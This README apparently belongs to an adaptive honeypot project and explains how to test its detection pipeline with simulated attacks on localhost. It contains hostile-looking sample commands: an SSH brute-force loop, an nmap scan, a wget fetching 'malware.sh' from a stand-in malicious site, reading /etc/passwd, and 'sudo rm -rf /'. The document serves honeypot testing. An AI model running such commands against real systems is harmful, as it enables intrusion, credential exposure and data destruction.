# Adaptive Honeypot Attack Simulation

This README outlines how to simulate attacks against your adaptive honeypot system for testing purposes. These local or scripted attacks trigger the same internal logging and anomaly detection mechanisms as real intrusions—ideal for verifying pipeline accuracy from ingestion to dashboard display.

## Project Structure (Updated)
```
├── Scripts/
│   ├── webapp.py               # Flask backend & API
│   └── main.py                 # Anomaly detection & ML pipeline
├── simulators/
│   └── bulk_attack_simulator.py  # Automated attack generation
├── database/
│   └── cowrie_events.db        # SQLite storage for all logs
├── templates/
│   └── index.html              # Flask UI dashboard
├── static/
│   └── style.css               # Web styling assets
```

##  Prerequisites
Before simulating attacks, make sure the following services are active:
- [ ] Cowrie honeypot (SSH)
- [ ] OpenCanary honeypot (FTP, HTTP, Redis, MySQL, etc.)
- [ ] Flask backend (`webapp.py`)
- [ ] SQLite database (`cowrie_events.db`)
- [ ] Anomaly detection via `main.py`

##  Simulating SSH Attacks (via Cowrie)
###  Manual Login Attempts
```bash
ssh root@localhost -p 2222
```
- Try random username/password combinations.
- Cowrie logs these into the database.

###  Brute Force Loop (via `sshpass`)
```bash
for i in {1..20}; do
  sshpass -p "wrongpass$i" ssh user$i@localhost -p 2222 -o StrictHostKeyChecking=no
done
```
> Requires `sshpass`: `sudo apt install sshpass`

##  Simulating OpenCanary Probes
OpenCanary listens for connections on multiple ports.

###  FTP/HTTP/Port Scan Examples
```bash
ftp localhost
curl http://localhost
nmap -sV -p 21,80,3306,6379 localhost
```
These simulate probes and enumeration attempts.

##  Simulating Malicious Commands (Cowrie Shell)
After logging into the Cowrie shell:
```bash
wget http://malicious.site/malware.sh
cat /etc/passwd
ls -la /var/www
```
These actions are parsed and analyzed for anomalies.

##  Web-Based Simulation Interface
If `webapp.py` is running:
1. Navigate to: `http://localhost:5000/simulate`
2. Input:
   - Fake usernames/passwords
   - Suspicious commands like `sudo rm -rf /`

This feeds directly into the backend and anomaly detection pipeline.

##  Bulk Attack Simulation Script
You can also simulate traffic via the `bulk_attack_simulator.py` script:
```bash
python3 simulators/bulk_attack_simulator.py
```
Options for fake log types (Cowrie, OpenCanary) and IP spoofing are available in the script parameters.

##  Triggering Anomalies via API
You can post directly to the API using:
```bash
curl -X POST http://localhost:5000/api/fake-log   -H "Content-Type: application/json"   -d '{"username": "admin", "password": "123456", "src_ip": "101.23.45.66"}'
```
Loop this with different IPs to simulate distributed attacks.

##  Monitoring and Verification
### Terminal Logs
- `webapp.py` will display incoming logs and anomaly classifications.

### SQLite DB
Query for flagged events:
```bash
sqlite3 database/cowrie_events.db
SELECT * FROM events WHERE is_anomaly = 1;
```

### Flask Dashboard
View live stats at: `http://localhost:5000`
- Flagged anomalies
- Credential entropy
- Command irregularities
- IP diversity patterns

##  Notes
- Cowrie listens on port `2222` by default.
- OpenCanary runs via `opencanaryd --start`.
- ML models (Isolation Forest, One-Class SVM) are triggered through `main.py`.